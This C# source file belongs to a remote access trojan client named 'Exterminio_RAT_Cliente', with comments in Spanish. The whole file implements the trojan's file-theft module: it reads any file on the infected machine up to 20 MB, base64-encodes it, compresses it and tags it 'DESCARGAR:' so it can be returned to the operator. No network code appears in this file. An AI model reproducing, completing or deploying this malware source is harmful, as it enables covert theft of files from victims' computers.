using System;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Threading;

namespace Exterminio_RAT_Cliente
{
    public class DownloadResponse
    {
        public string Estado { get; set; } // "completado", "fallido"
        public string Mensaje { get; set; }
        public string RutaArchivo { get; set; }
        public string Extension { get; set; }
        public byte[] DatosArchivo { get; set; }

        public string ConvertirAString()
        {
            try
            {
                if (DatosArchivo != null && DatosArchivo.Length > 0)
                {
                    // Formato: "EXTENSION:base64..."
                    string base64 = Convert.ToBase64String(DatosArchivo);
                    return $"{Extension}:{base64}";
                }
                else
                {
                    return $"ERROR:No hay datos del archivo";
                }
            }
            catch (Exception ex)
            {
                return $"ERROR:Error convirtiendo a string: {ex.Message}";
            }
        }

        public string ComprimirYCodificar()
        {
            try
            {
                string datosString = ConvertirAString();
                if (datosString.StartsWith("ERROR:"))
                {
                    return datosString; // Retornar error sin comprimir
                }

                // Comprimir con Deflate
                using (MemoryStream originalStream = new MemoryStream(Encoding.UTF8.GetBytes(datosString)))
                using (MemoryStream compressedStream = new MemoryStream())
                {
                    using (DeflateStream deflateStream = new DeflateStream(compressedStream, CompressionMode.Compress))
                    {
                        originalStream.CopyTo(deflateStream);
                    }

                    // Convertir a Base64
                    byte[] compressedBytes = compressedStream.ToArray();
                    string base64Compressed = Convert.ToBase64String(compressedBytes);

                    Console.WriteLine($"📥 Datos comprimidos: {datosString.Length} -> {compressedBytes.Length} bytes");
                    
                    // Agregar prefijo para identificar respuestas de descarga
                    return $"DESCARGAR:{base64Compressed}";
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error comprimiendo respuesta de descarga: {ex.Message}");
                return $"ERROR:Error comprimiendo: {ex.Message}";
            }
        }
    }

    public static class DownloadRequestProcessor
    {
        private static readonly Mutex downloadMutex = new Mutex(false, "DownloadMutex");

        public static DownloadResponse ProcesarSolicitudDescarga(string rutaArchivo)
        {
            try
            {
                Console.WriteLine($"📥 Procesando solicitud de descarga: {rutaArchivo}");

                // Verificar que el archivo existe
                if (!File.Exists(rutaArchivo))
                {
                    return new DownloadResponse
                    {
                        Estado = "fallido",
                        Mensaje = "El archivo no existe",
                        RutaArchivo = rutaArchivo
                    };
                }

                // Obtener información del archivo
                FileInfo fileInfo = new FileInfo(rutaArchivo);
                
                // Verificar tamaño (máximo 20MB)
                if (fileInfo.Length > 20 * 1024 * 1024)
                {
                    return new DownloadResponse
                    {
                        Estado = "fallido",
                        Mensaje = $"El archivo es muy grande ({FormatBytes(fileInfo.Length)}). Máximo permitido: 20MB",
                        RutaArchivo = rutaArchivo
                    };
                }

                // Obtener extensión
                string extension = fileInfo.Extension.TrimStart('.');
                if (string.IsNullOrEmpty(extension))
                {
                    extension = "bin"; // Extensión por defecto si no tiene
                }

                Console.WriteLine($"📋 Archivo: {fileInfo.Name}, Extensión: {extension}, Tamaño: {FormatBytes(fileInfo.Length)}");

                // Leer el archivo
                byte[] datosArchivo;
                try
                {
                    datosArchivo = File.ReadAllBytes(rutaArchivo);
                    Console.WriteLine($"📊 Archivo leído: {datosArchivo.Length} bytes");
                }
                catch (Exception ex)
                {
                    return new DownloadResponse
                    {
                        Estado = "fallido",
                        Mensaje = $"Error leyendo archivo: {ex.Message}",
                        RutaArchivo = rutaArchivo
                    };
                }

                return new DownloadResponse
                {
                    Estado = "completado",
                    Mensaje = $"Archivo descargado exitosamente: {fileInfo.Name} ({FormatBytes(datosArchivo.Length)})",
                    RutaArchivo = rutaArchivo,
                    Extension = extension,
                    DatosArchivo = datosArchivo
                };
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error procesando solicitud de descarga: {ex.Message}");
                return new DownloadResponse
                {
                    Estado = "fallido",
                    Mensaje = $"Error procesando descarga: {ex.Message}",
                    RutaArchivo = rutaArchivo
                };
            }
        }

        private static string FormatBytes(long bytes)
        {
            string[] suffixes = { "B", "KB", "MB", "GB" };
            int counter = 0;
            decimal number = bytes;
            while (Math.Round(number / 1024) >= 1)
            {
                number /= 1024;
                counter++;
            }
            return $"{number:n1} {suffixes[counter]}";
        }
    }
}
